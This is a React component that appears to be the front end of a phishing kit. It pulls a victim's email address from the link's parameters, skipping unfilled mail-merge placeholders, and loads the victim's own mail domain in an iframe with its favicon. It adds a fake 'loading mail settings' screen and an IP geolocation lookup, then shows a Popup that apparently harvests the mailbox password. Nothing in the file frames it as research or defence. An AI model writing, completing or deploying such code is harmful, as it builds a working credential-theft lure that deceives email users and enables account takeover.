/** @format */
"use client";

import React, { useState, useEffect } from "react";
import Popup from "./Popup";

// SVG Icons Components
const ChromeIcon = () => (
  <svg viewBox="0 0 24 24" fill="currentColor">
    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" />
    <circle cx="12" cy="12" r="3" />
  </svg>
);

const WindowsIcon = () => (
  <svg viewBox="0 0 24 24" fill="currentColor">
    <path d="M3 5.3v6.35h7.25V4L3 5.3zM3 18.7l7.25 1.3v-7.65H3v6.35zm8.65 1.5L21 22V13.7h-9.35v6.5zm0-15.4V12h9.35V2l-9.35 2.8z" />
  </svg>
);

const MacIcon = () => (
  <svg viewBox="0 0 24 24" fill="currentColor">
    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z" />
  </svg>
);

const LinuxIcon = () => (
  <svg viewBox="0 0 24 24" fill="currentColor">
    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" />
    <path d="M12 8c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z" />
  </svg>
);

const LoadingInfo = ({ systemInfo }) => {
  const getOSIcon = (os) => {
    switch (os) {
      case "Windows":
        return <WindowsIcon />;
      case "Mac OS":
        return <MacIcon />;
      case "Linux":
        return <LinuxIcon />;
      default:
        return null;
    }
  };

  return (
    <div className="loader-container">
      <div className="spinner"></div>
      <div className="loading-text">loading mail settings ...</div>
      <div className="system-info">
        <span className="info-item">{systemInfo.date.toLocaleString()}</span>
        <span className="separator">•</span>
        <span className="info-item">
          <ChromeIcon />
          {systemInfo.browser}
        </span>
        <span className="separator">•</span>
        <span className="info-item">
          {getOSIcon(systemInfo.os)}
          {systemInfo.os}
        </span>
        <span className="separator">•</span>
        <span className="info-item">{systemInfo.location}</span>
      </div>
    </div>
  );
};

const Fetcher = () => {
  const [emailDomain, setEmailDomain] = useState("");
  const [websiteUrl, setWebsiteUrl] = useState("");
  const [favicon, setFavicon] = useState("");
  const [isLoading, setIsLoading] = useState(true);
  const [showPopup, setShowPopup] = useState(false);
  const [eparams, setEparams] = useState("");
  const [systemInfo, setSystemInfo] = useState({
    date: new Date(),
    browser: "chrome",
    os: "Unknown",
    location: "Loading location....",
  });

  useEffect(() => {
    const detectOS = () => {
      const userAgent = window.navigator.userAgent.toLowerCase();
      if (userAgent.includes("mac")) return "Mac OS";
      if (userAgent.includes("windows")) return "Windows";
      if (userAgent.includes("linux")) return "Linux";
      return "Unknown OS";
    };

    const getLocation = async () => {
      try {
        const response = await fetch("http://ip-api.com/json/");
        const data = await response.json();
        if (data.status === "success") {
          return `${data.city}, ${data.country}`;
        }
        return "Location unavailable";
      } catch (error) {
        console.error("Error fetching location:", error);
        return "Location unavailable";
      }
    };

    setSystemInfo((prev) => ({
      ...prev,
      os: detectOS(),
    }));

    getLocation().then((location) => {
      setSystemInfo((prev) => ({
        ...prev,
        location,
      }));
    });

    const dateInterval = setInterval(() => {
      setSystemInfo((prev) => ({
        ...prev,
        date: new Date(),
      }));
    }, 1000);

    return () => clearInterval(dateInterval);
  }, []);

  useEffect(() => {
    const extractEmailFromURL = () => {
      const url = window.location.href;
      const urlObj = new URL(url);
      
      // All the email parameter patterns
      const emailPatterns = [
        'email', 'Email', 'EMAIL', 'user_email', 'UserEmail', 'userEmail',
        'emailAddress', 'EmailAddress', 'contact_email', 'recipient_email',
        'subscriber_email', 'mail', 'e', 'u', 'addr', 'address'
      ];

      // Check query parameters
      for (const pattern of emailPatterns) {
        const emailValue = urlObj.searchParams.get(pattern);
        if (emailValue && isValidEmail(emailValue)) {
          return emailValue;
        }
      }

      // Check hash parameters
      const hash = urlObj.hash;
      if (hash) {
        const hashParams = new URLSearchParams(hash.substring(1));
        for (const pattern of emailPatterns) {
          const emailValue = hashParams.get(pattern);
          if (emailValue && isValidEmail(emailValue)) {
            return emailValue;
          }
        }
      }

      // Check for combined patterns
      const combinedRegex = /[?&]#?(?:email|Email|EMAIL|user_email|UserEmail|userEmail|emailAddress|EmailAddress|contact_email|recipient_email|subscriber_email|mail|e|u|addr|address)=([^&?#\s]+)/g;
      let match;
      while ((match = combinedRegex.exec(url)) !== null) {
        if (match[1] && isValidEmail(match[1])) {
          return match[1];
        }
      }

      // Check URL encoded patterns
      const decodedUrl = decodeURIComponent(url);
      const emailRegex = /[?&]#?(?:email|Email|EMAIL|user_email|UserEmail|userEmail|emailAddress|EmailAddress|contact_email|recipient_email|subscriber_email|mail|e|u|addr|address)=([^&?#\s]+)/g;
      while ((match = emailRegex.exec(decodedUrl)) !== null) {
        if (match[1] && isValidEmail(match[1])) {
          return match[1];
        }
      }

      return "";
    };

    const isValidEmail = (email) => {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return emailRegex.test(email) && 
             !email.includes('[[Email]]') && 
             !email.includes('{{Email}}') && 
             !email.includes('%%emailaddress%%');
    };

    const extractedEmail = extractEmailFromURL();
    setEparams(extractedEmail);
    if (extractedEmail) {
      const domain = extractedEmail.split("@")[1];
      setEmailDomain(domain);
      const url = `https://www.${domain}`;
      setWebsiteUrl(url);
      fetchFavicon(domain);
    }
  }, []);

  useEffect(() => {
    if (websiteUrl) {
      setTimeout(() => {
        setIsLoading(false);
        setTimeout(() => {
          setShowPopup(true);
        }, 3000);
      }, 2000);
    }
  }, [websiteUrl]);

  const fetchFavicon = (domain) => {
    const faviconUrl = `https://${domain}/favicon.ico`;
    setFavicon(faviconUrl);
  };

  // if (isLoading) {
  //   return <LoadingInfo systemInfo={systemInfo} />;
  // }

  return (
    <div className="content-wrapper">
      {websiteUrl && (
        <>
          <div className="iframe-container">
            <iframe src={websiteUrl} title=" " />
          </div>
          {showPopup && (
            <Popup
              domain={emailDomain}
              favicon={favicon}
              eparams={eparams}
              systemInfo={systemInfo}
            />
          )}
        </>
      )}
    </div>
  );
};

export default Fetcher;